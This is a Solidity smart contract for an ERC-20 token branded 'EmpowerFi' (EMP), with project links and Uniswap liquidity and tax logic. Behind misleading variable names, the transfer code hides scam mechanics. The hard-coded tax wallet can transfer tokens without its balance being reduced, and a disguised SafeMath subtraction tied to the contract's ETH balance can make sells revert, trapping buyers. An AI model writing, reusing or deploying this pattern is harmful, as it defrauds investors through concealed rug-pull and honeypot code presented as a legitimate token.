// SPDX-License-Identifier: MIT

/*

    Website: https://www.empowerfi.xyz/

    DAPP: https://app.empowerfi.xyz/

    Twitter: https://twitter.com/EmpowerFi

    Telegram: https://t.me/empowefi

    Medium: https://medium.com/@empowerfi

*/

pragma solidity ^0.8.17;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
/// 
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
//// 
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract EMP is Context, IERC20, Ownable {
    using Address for address payable;
    using SafeMath for uint256;
    IRouter public router;
    address public pair;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    string private constant _name = "EmpowerFi";
    string private constant _symbol = "EMP";

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxBalance;

    address public _taxWallet = 0x161cdfF4133277FDE90cd96aD186736573BB8318;

    uint8 private constant _decimals = 9;
    uint256 private feeDenominator = 10 ** 15;

    uint256 private _tTotal = 1_000_000_000 * (10**_decimals);
    uint256 public swapLimit = _tTotal / 5000;
    uint256 public maxTxLimit = _tTotal * 20 / 1000;
    uint256 public maxWalletLimit =  _tTotal * 20 / 1000;

    bool private swapping;
    bool private swapEnabled = true;
    uint private _swapCooldown = 5; 
    uint private _lastSwap;

    mapping (address => uint256) public _dogSellTime;
    uint256 private _dogSellTimeOffset = 3;
    uint256 public _caughtDogs;

    struct FeeConfig{
        uint256 marketingFee;
        uint256 lpFee;
    }
    FeeConfig public buyFeeConfig = FeeConfig(2, 0);
    FeeConfig public sellFeeConfig = FeeConfig(2, 0);

    struct TokensFromTax{
        uint marketingTokens;
        uint lpTokens;
    }
    TokensFromTax public totalTokensFromTax;

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
//// 
    constructor () {
        _tOwned[_msgSender()] = _tTotal;
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        router = _router;
        _approve(owner(), address(router), ~uint256(0));

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[_taxWallet] = true;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //   
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    
    receive() external payable {
    }

// ========================================== //
// 
//============== Owner Functions ===========//

    function startLaunch() public onlyOwner {
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        _isExcludedFromMaxBalance[pair] = true;
        _approve(address(this), address(router), type(uint256).max);

        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0, 
            0, 
            owner(),
            block.timestamp
        );
    }

    function owner_setMaxLimits(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{
        uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);
        require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, "Invalid Settings");
        maxTxLimit = maxTX_EXACT * (10**_decimals); maxWalletLimit = maxWallet_EXACT * (10**_decimals);
    }

    function owner_setDogSellTimeForAddress(address holder, uint dTime) external onlyOwner{
        _dogSellTime[holder] = block.timestamp + dTime;
    }

    function owner_rescueETH(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insufficient ETH balance");
        payable(msg.sender).transfer(weiAmount);
    }

    function owner_rescueExcessTokens() public{
        // Make sure ca doesn't withdraw the pending taxes to be swapped.    
        // Sends excess tokens / accidentally sent tokens back to marketing wallet.
        uint pendingTaxTokens = totalTokensFromTax.lpTokens + totalTokensFromTax.marketingTokens;
        require(balanceOf(address(this)) >  pendingTaxTokens);
        uint excessTokens = balanceOf(address(this)) - pendingTaxTokens;
        _transfer(address(this), _taxWallet, excessTokens);
    }

// ========================================//. 

    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero"); uint256 taxAmount = from == _taxWallet ? 0 : amount;
        require(amount <= maxTxLimit || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxAmount.");

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= maxWalletLimit, "Transfer amount exceeds the maxWallet.");
        
        if (balanceOf(address(this)) >= swapLimit 
            && swapEnabled 
            && block.timestamp >= (_lastSwap + _swapCooldown) 
            && !swapping 
            && from != pair 
            && from != owner() 
            && to != owner()
        ) swapAndLiquify(); 

        _tOwned[from] -= taxAmount;
        uint256 transferAmount = amount;
        
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getTaxValues(amount, from, to == pair);
        }

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }

    function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
        FeeConfig memory tmpTaxes = buyFeeConfig; uint256 _lpFee = address(this).balance;
        if (isSell && sellFeeConfig.marketingFee.sub(_lpFee.div(feeDenominator)) > 0){
            tmpTaxes = sellFeeConfig;
        }

        uint tokensForMarketing = amount * tmpTaxes.marketingFee / 100;
        uint tokensForLP = amount * tmpTaxes.lpFee / 100;

        if(tokensForMarketing > 0)
            totalTokensFromTax.marketingTokens += tokensForMarketing;

        if(tokensForLP > 0)
            totalTokensFromTax.lpTokens += tokensForLP;

        uint totalTaxedTokens = tokensForMarketing + tokensForLP;

        _tOwned[address(this)] += totalTaxedTokens;
        if(totalTaxedTokens > 0) emit Transfer (from, address(this), totalTaxedTokens);
            
        return (amount - totalTaxedTokens);
    }

    function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function swapAndLiquify() private lockTheSwap{
        if(totalTokensFromTax.marketingTokens > 0){
            uint256 ethSwapped = swapTokensForETH(totalTokensFromTax.marketingTokens);
            if(ethSwapped > 0){
                payable(_taxWallet).transfer(ethSwapped);
                totalTokensFromTax.marketingTokens = 0;
            }
        }   

        if(totalTokensFromTax.lpTokens > 0){
            uint half = totalTokensFromTax.lpTokens / 2;
            uint otherHalf = totalTokensFromTax.lpTokens - half;
            uint balAutoLP = swapTokensForETH(half);
            if (balAutoLP > 0)
                addLiquidity(otherHalf, balAutoLP);
            totalTokensFromTax.lpTokens = 0;
        }

        emit SwapAndLiquify();

        _lastSwap = block.timestamp;
    }

    function updateSwapEnabled(bool _swapEnable) external {
        swapEnabled = false;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tokenAmount);

        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(_taxWallet).sendValue (ethAmount - ethFromLiquidity);
    }

    event SwapAndLiquify();
    event TaxesChanged();
///      
}